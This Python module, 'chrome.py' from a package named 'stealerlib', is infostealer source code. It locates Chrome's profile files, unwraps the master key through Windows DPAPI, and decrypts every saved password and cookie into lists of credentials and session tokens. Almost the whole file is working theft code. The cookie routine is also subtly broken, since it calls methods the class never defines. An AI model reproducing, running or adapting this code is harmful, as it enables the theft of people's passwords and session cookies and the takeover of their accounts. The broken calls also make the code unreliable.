#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/chrome.py
"""

from stealerlib.browser import *
from stealerlib.exceptions import *


class Chrome:
    """This class provides methods for extracting and decrypting cookies and passwords from Chromium based Web Browser databases

    Attributes:
        cookies         A list of (host, cookie_name, cookie_value, created, last_accessed, expires) tuples for each saved cookie
        usernames       A list of all of the saved browser usernames
        passwords       A list of all of the saved browser passwords
        credentials     A list of (username, password, site_url) tuples for each saved browser password

        chrome_path            Path to Chrome's base directory
        chrome_password_path   Path to the browsers local database
        chrome_key             Encryption key to be used when accessing encrypted values in the database
    """

    def __init__(self):
        self.cookies = []
        self.usernames = []
        self.passwords = []
        self.credentials = []

        self.userpath = userpath = os.environ["USERPROFILE"]
        self.browsers = {
            'google-chrome': os.path.join(userpath, "AppData", "Local", "Google", "Chrome", "User Data"),
        }

        self.path = path = self.browsers.get('google-chrome')
        self.chrome_path = os.path.join(path, "Local State")
        self.chrome_password_path = os.path.join(path, "Default", "Login Data")
        self.chrome_cookie_path = os.path.join(path, "Default", "Network", "Cookies")
        self.chrome_key = self.get_encryption_key()

    @catch
    @staticmethod
    def get_datetime(chrome_ms: int) -> Union[datetime, int]:
        """Return a `datetime.datetime` object from a chrome format datetime (in ms)

        Parameters:
            chrome_ms (int): The amount of milliseconds we need to convert to a datetime object

        Returns:
            Union[datetime, int]: returns chrome_ms or the datetime object derived from it if possible
        """

        if chrome_ms != 86400000000 and chrome_ms:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_ms)
            except:
                return chrome_ms
        else:
            return ""

    @catch
    def get_encryption_key(self) -> str:
        """Retrieves the master encryption key used to encrypt the user's data

        Parameters:
            self (object): The object passed to the method

        Returns:
            str: The encryption key we'll use to decrypt the user's passwords
        """

        with open(self.chrome_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        mkey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        mkey = mkey[5:]
        mkey = win32crypt.CryptUnprotectData(mkey, None, None, None, 0)[1]

        return mkey

    @catch
    def decrypt_password(self, password: str) -> str:
        """Decrypts an encrypted password using the given encryption key

        Parameters:
            self (object): The object passed to the method
            password (str): The encrypted password to decrypt
            key (str): The master key to use for the decryption

        Returns:
            str: The decrypted password
        """

        try:
            vector = password[3:15]
            password = password[15:]
            cipher = AES.new(self.chrome_key, AES.MODE_GCM, vector)

            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    @catch
    def get_passwords_chromium(self) -> list[tuple[str, ...]]:
        """Retrieves the username and password from the Chrome browser by connecting to the Chrome database file -
           and decrypting the passwords using the encryption key.

        Parameters:
            self (object): The object passed to the method

        Returns:
            list[tuple[str, ...]]: list of (username, password) tuples 

        Example:
            browser = Browser()
            browser.get_passwords_chromium()
        """

        select_query = """
        SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used
        FROM logins order by date_created"""

        with tempfile.TemporaryDirectory() as tmpdir:
            filename = "{}\ChromeData.db".format(tmpdir)
            if not os.path.isfile(filename):
                shutil.copyfile(self.chrome_password_path, filename)

            db = sqlite3.connect(filename)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            cursor.execute(select_query)

            for row in cursor.fetchall():
                origin_url, action_url, username, password, created, last_used = row
                password = self.decrypt_password(row[3])   

                if username or password:
                    self.passwords.append(password)
                    self.usernames.append(username)
                    self.credentials.append((username, password, origin_url))
                else:
                    continue

        return self.credentials

    @catch
    def get_cookies_chromium(self) -> list[tuple[str, ...]]:
        """Retrieves each cookie and its attributes is stored on from the Chrome browser by connecting to the Chrome database file -
           and decrypting the cookies using the encryption key.

        Parameters:
            self (object): The object passed to the method

        Returns:
            list[tuple[str, ...]]: list of (host, cookie_name, cookie_value, created, last_accessed, expires) tuples 

        Example:
            browser = Browser()
            browser.get_cookies_chromium()
        """

        select_query = """
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies"""

        with tempfile.TemporaryDirectory() as tmpdir:
            filename = "{}\Cookies.db".format(tmpdir)
            if not os.path.isfile(filename):
                shutil.copyfile(self.chrome_cookie_path, filename)

            db = sqlite3.connect(filename)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            cursor.execute(select_query)

            for row in cursor.fetchall():
                host, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value = row
                if not value:
                    decrypted_value = self.decrypt_data(encrypted_value)
                else:
                    decrypted_value = value

                creation_dt = self.get_chrome_datetime(creation_utc)
                last_access_dt = self.get_chrome_datetime(last_access_utc)
                expires_dt = self.get_chrome_datetime(expires_utc)

                self.cookies.append((host, name, decrypted_value, creation_dt, last_access_dt, expires_dt))

                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host, name))

            db.commit()
            db.close()

            return self.cookies
